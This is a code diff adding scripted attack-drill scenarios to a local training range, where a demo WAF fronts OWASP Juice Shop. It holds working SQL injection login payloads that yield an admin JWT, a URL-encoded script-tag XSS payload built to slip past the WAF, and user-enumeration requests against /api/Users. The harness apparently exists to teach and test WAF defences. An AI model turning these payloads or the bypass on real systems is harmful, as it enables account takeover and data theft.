@@ -212,6 +212,29 @@ def waf_get() -> dict:
         return {"ok": False, "waf": None}
 
 
+def _await_waf_mode(mode: str, timeout: float = 3.0) -> bool:
+    """Bind-mount writes are not instant (macOS Docker lags up to a few hundred ms).
+    Use a WAF-trippable payload so the settle check distinguishes on/off modes:
+      - block  → the payload is 403'd by the WAF
+      - bypass → the payload reaches the target (200 for valid admin credentials, 401 for invalid)
+    """
+    import time as _t
+    # Every WAF sqli rule will block this line when WAF is on.
+    sqli_line = "admin@juice-sh.op' OR 1=1 --"
+    deadline = _t.monotonic() + timeout
+    want = 403 if mode == "block" else None  # None == "any status not 403"
+    while _t.monotonic() < deadline:
+        st, _ = _http(WAF_HOST_PORT, "POST", "/rest/user/login", {"email": sqli_line, "password": "x"})
+        if mode == "block":
+            if st == 403:
+                return True
+        else:  # bypass: sqli line reaches target → 200 admin or other
+            if st != 403:
+                return True
+        _t.sleep(0.15)
+    return False
+
+
 def stop() -> dict:
     errors = []
     # Remove individually: absent resources are harmless on repeated stops.
@@ -284,11 +307,243 @@ def judge_http(path: str = "/api/Challenges") -> dict:
         return {"ok": True, "raw": out[:400]}
 
 
+# ── Live drill scenarios ──────────────────────────────────────────────────
+# The range host is fixed (Kali → WAF → Juice Shop). A "scenario" is a named,
+# judged attack line against that host — a different playbook and oracle, not a
+# different container. Each entry is verified against the running target before
+# shipping (see 01_specs/live-drill-scenarios-2026-09-29.md).
+
+def _http(port: int, method: str, path: str, body=None, headers: dict | None = None):
+    import http.client
+    h = dict(headers or {})
+    payload = None
+    if body is not None:
+        if isinstance(body, (dict, list)):
+            payload = json.dumps(body).encode()
+            h.setdefault("Content-Type", "application/json")
+        elif isinstance(body, str):
+            payload = body.encode()
+        else:
+            payload = body
+    c = http.client.HTTPConnection("127.0.0.1", port, timeout=12)
+    c.request(method, path, body=payload, headers=h)
+    r = c.getresponse()
+    return r.status, r.read().decode("utf-8", "replace")
+
+
+def _jwt_payload(token: str) -> dict:
+    import base64
+    p = token.split(".")[1]
+    p += "=" * (-len(p) % 4)
+    try:
+        return json.loads(base64.urlsafe_b64decode(p).decode("utf-8", "replace").replace("\n", "").replace("\r", ""))
+    except Exception:
+        return {}
+
+
+_ING = {"password": "x", "birthDay": "2000-01-01", "gender": "other", "countryCode": "US",
+        "street": "a", "houseNumber": "1", "city": "z", "state": "z", "zipCode": "1",
+        "administrativeArea": "z"}
+
+
+def _register(tag: str) -> tuple[int, str]:
+    uid = tag
+    st, body = _http(WAF_HOST_PORT, "POST", "/api/users",
+                     {"email": uid + "@demo.test", "username": uid, "password": "x",
+                      "firstName": uid[:24], "lastName": uid[:24], **_ING})
+    return st, body
+
+
+def _login_token(email: str) -> str:
+    st, body = _http(HOST_PORT, "POST", "/rest/user/login",
+                     {"email": email, "password": "x"})
+    try:
+        return json.loads(body)["authentication"]["token"]
+    except Exception:
+        return ""
+
+
+SCENARIOS: dict[str, dict] = {
+    "sqli_session": {
+        "name": "SQL 注入 · 会话劫持",
+        "blurb": "登录接口未参数化：错密码 + 注入也能拿到 admin 会话，JWT 里还能直接看到 admin 密码哈希。",
+        "waf": "depends",
+        "oracle": "WAF 开 → 403(sqli_logic)；WAF 关 → 200 且 JWT 含 role=admin、password=…(非空)",
+        "steps": ["WAF 开时 fire 登录 → 403", "WAF 关时 fire 同一条 → 200", "解 JWT 看 data.role / data.password"],
+        "boundary": "只验证规则里那条 SQLi payload 在本靶上可复现；不等同实网所有登录框都可注。",
+    },
+    "xss_encoded_bypass": {
+        "name": "XSS 编码绕过 · WAF 盲区",
+        "blurb": "WAF 只认字面 <script>；注册时把 script 标签单 URL 编码一次即通过——WAF REMOVE-encoding 还是 403。",
+        "waf": "depends",
+        "oracle": "字面 <script> → 403(xss_script)；单编码 %3Cscript%3E → 201/200 注册通过",
+        "steps": ["fire 字面量 → 403", "fire 单编码 → 201", "两份注册请求除编码外逐字节相同"],
+        "boundary": "证明的是演示 WAF 规则集对 URL 编码不健壮；生产 WAF 通常去编码后再匹配。",
+    },
+    "bac_enumeration": {
+        "name": "越权 · 跨用户枚举",
+        "blurb": "普通顾客 token 拉 /api/Users 能枚举整个用户表（含他人 email/username/id）——应用鉴权漏了 owner 校验。与 WAF 无关。",
+        "waf": "independent",
+        "oracle": "任意顾客 token GET /api/Users → 200，返回 ≥2 用户，其中至少一个 email 非本人",
+        "steps": ["注册一个顾客", "用它登录拿 token", "同 token GET /api/Users 数行数并列出他人"],
+        "boundary": "读的是本靶 /api/Users 端点的授权行为；不同 Juice Shop 版本该端点鉴权策略可能不同。",
+    },
+}
+SCENARIO_KEYS = tuple(SCENARIOS)
+
+
+def scenario_catalog() -> dict:
+    return {"range": {"red": RED_NAME, "blue": BLUE_NAME, "target": TARGET_NAME,
+                      "entry": RED_ENTRY, "target_http": TARGET_HTTP, "waf_http": WAF_HTTP},
+            "scenarios": {k: dict(v) for k, v in SCENARIOS.items()}}
+
+
+# Monotonic counter made unique per process so repeated fires (demo then judge)
+# never collide on the same demo email within a burst of calls.
+_FIRE_SEQ = iter(range(10**6))
+
+
+def _tag(prefix: str) -> str:
+    return f"{prefix}{int(time.time() % 10**6)}{next(_FIRE_SEQ) % 10**4:04d}"
+
+
+def _fire_sqli(port):
+    """Returns (attack_status, jwt_payload-or-None) after firing the SQLi login line."""
+    st, body = _http(port, "POST", "/rest/user/login",
+                     {"email": "admin@juice-sh.op' OR 1=1 --", "password": "x"})
+    jwt = None
+    try:
+        jwt = _jwt_payload(json.loads(body)["authentication"]["token"])
+    except Exception:
+        pass
+    return st, jwt, body
+
+
+def _fire_xss(port):
+    tag = _tag("xls")
+    e = {"email": tag + "@demo.test", "username": tag, "password": "x",
+         "firstName": "E2E", "lastName": "B", **_ING}
+    raw = dict(e); raw["cookie"] = "<script>e2e-x</script>"
+    enc = dict(e); enc["cookie"] = "%3Cscript%3Ee2e-x%3C%2Fscript%3E"
+    s1, b1 = _http(port, "POST", "/api/users", raw)
+    s2, b2 = _http(port, "POST", "/api/users", enc)
+    return {"literal": (s1, b1[:200]), "encoded": (s2, b2[:200])}
+
+
+def _fire_bac():
+    uid = _tag("bac")
+    st, _ = _register(uid)
+    tok = _login_token(uid + "@demo.test")
+    if not tok:
+        return {"ok": False, "msg": "customer login failed", "register": st}
+    s, b = _http(WAF_HOST_PORT, "GET", "/api/Users", headers={"Authorization": "Bearer " + tok})
+    try:
+        data = json.loads(b).get("data", [])
+    except Exception:
+        return {"ok": False, "msg": "parse /api/Users", "register": st, "auth": s, "raw": b[:160]}
+    mine = [u for u in data if u.get("email") == uid + "@demo.test"]
+    others = [u for u in data if u.get("email") != uid + "@demo.test"]
+    return {"ok": s == 200 and len(data) >= 2, "status": s,
+            "total_users": len(data), "self": len(mine), "others": len(others),
+            "other_sample": [{"id": u.get("id"), "email": u.get("email"), "username": u.get("username")}
+                              for u in others[:20]]}
+
+
+def judge_scenario(key: str) -> dict:
+    """Server-side oracle for one scenario. No model; reads the target directly."""
+    if key not in SCENARIOS:
+        return {"ok": False, "msg": f"未知场景: {key}（可选 {list(SCENARIOS)}）"}
+    st = status()
+    if not st["running"]:
+        return {"ok": False, "msg": "演练场未启动"}
+    ev = {"scenario": key, "waf": waf_get().get("waf")}
+    # The bind-mounted mode file can lag the container; settle so the verdict is
+    # deterministic rather than racy.
+    if ev["waf"] in ("block", "bypass"):
+        _await_waf_mode(ev["waf"])
+    if key == "sqli_session":
+        s, jwt, b = _fire_sqli(WAF_HOST_PORT)
+        ev["via_waf"] = {"status": s, "body": b[:200], "jwt": jwt}
+        ev["sqli_hits_admin"] = bool(jwt and jwt.get("data", {}).get("role") == "admin" and jwt.get("data", {}).get("password"))
+        ev["password_hash_leaked"] = bool(jwt and jwt.get("data", {}).get("password"))
+        ev["oracle_pass"] = ev["sqli_hits_admin"] if ev["waf"] == "bypass" else (s == 403 and "sqli" in b[:200])
+    elif key == "xss_encoded_bypass":
+        r = _fire_xss(WAF_HOST_PORT)
+        ev["literal"] = {"status": r["literal"][0], "body": r["literal"][1]}
+        ev["encoded"] = {"status": r["encoded"][0], "body": r["encoded"][1]}
+        ev["literal_blocked"] = r["literal"][0] == 403 and "xss" in r["literal"][1]
+        ev["encoded_passes"] = r["encoded"][0] in (200, 201)
+        ev["oracle_pass"] = ev["literal_blocked"] and ev["encoded_passes"]
+    elif key == "bac_enumeration":
+        r = _fire_bac()
+        ev.update({k: v for k, v in r.items() if k != "ok"})
+        ev["oracle_pass"] = r.get("ok") and r.get("others", 0) >= 1
+    ev["oracle_text"] = SCENARIOS[key]["oracle"]
+    ev["oracle"] = "pass" if ev.get("oracle_pass") else "fail"
+    return ev
+
+
+def _flip(mode: str) -> bool:
+    """Switch WAF mode and wait until the container actually honors it."""
+    waf_set(mode)
+    return _await_waf_mode(mode)
+
+
+def run_scenario(key: str, restore_waf: bool = True) -> dict:
+    """Deterministic, model-free demo of one scenario. Writes to the local events log."""
+    if key not in SCENARIOS:
+        return {"ok": False, "msg": f"未知场景: {key}"}
+    st = status()
+    if not st["running"]:
+        return {"ok": False, "msg": "演练场未启动，先 start"}
+    orig = waf_get().get("waf") or "block"
+    record = {"at": time.strftime("%F %T"), "scenario": key, "orig_waf": orig}
+    try:
+        if key in ("sqli_session", "xss_encoded_bypass"):
+            if key == "sqli_session":
+                _flip("block"); s, jwt, b = _fire_sqli(WAF_HOST_PORT)
+                record["waf_block"] = {"status": s, "waf_bypassed": False,
+                                      "body_has_sqli_rule": "sqli" in b[:120], "jwt_role": (jwt or {}).get("data", {}).get("role")}
+                _flip("bypass"); s2, jwt2, b2 = _fire_sqli(WAF_HOST_PORT)
+                record["waf_bypass"] = {"status": s2, "jwt_role": (jwt2 or {}).get("data", {}).get("role"),
+                                        "password_hash_leaked": bool((jwt2 or {}).get("data", {}).get("password"))}
+            else:
+                _flip("block"); r = _fire_xss(WAF_HOST_PORT)
+                record["block_literal"] = {"status": r["literal"][0], "xss_rule": "xss" in r["literal"][1][:120]}
+                record["block_encoded"] = {"status": r["encoded"][0], "passed": r["encoded"][0] in (200, 201)}
+            record["judge"] = judge_scenario(key)
+            record["verdict"] = record["judge"].get("oracle")
+        elif key == "bac_enumeration":
+            record["judge"] = judge_scenario(key)
+            record["verdict"] = record["judge"].get("oracle")
+            record["note"] = "WAF-independent：只要靶机应用鉴权漏洞存在就复现，与 WAF 开/关无关。"
+    except Exception as e:
+        record["error"] = f"{type(e).__name__}: {e}"
+    finally:
+        if restore_waf and key in ("sqli_session", "xss_encoded_bypass"):
+            waf_set(orig)
+    record["restored_waf"] = waf_get().get("waf")
+    _log({"at": time.strftime("%F %T"), "evt": "scenario_run", "record": record})
+    return {"ok": "error" not in record, "scenario": key, "name": SCENARIOS[key]["name"], **record}
+
+
+def scenario_list() -> list[dict]:
+    return [{"id": k, "name": v["name"], "blurb": v["blurb"], "waf": v["waf"],
+             "oracle": v["oracle"], "boundary": v["boundary"]} for k, v in SCENARIOS.items()]
+
+
 if __name__ == "__main__":
     import sys
     fn = sys.argv[1] if len(sys.argv) > 1 else "status"
     if fn == "waf":
         print(json.dumps(waf_set(sys.argv[2]), ensure_ascii=False, indent=1))
+    elif fn == "scenario":
+        if len(sys.argv) > 2 and sys.argv[2] in SCENARIOS:
+            print(json.dumps(judge_scenario(sys.argv[2]), ensure_ascii=False, indent=1))
+        else:
+            print(json.dumps({"ok": True, "scenarios": scenario_list()}, ensure_ascii=False, indent=1))
+    elif fn == "run":
+        print(json.dumps(run_scenario(sys.argv[2]), ensure_ascii=False, indent=1))
     else:
         print(json.dumps({"start": start, "stop": stop, "status": status,
                           "judge": judge_http}.get(fn, status)(), ensure_ascii=False, indent=1))
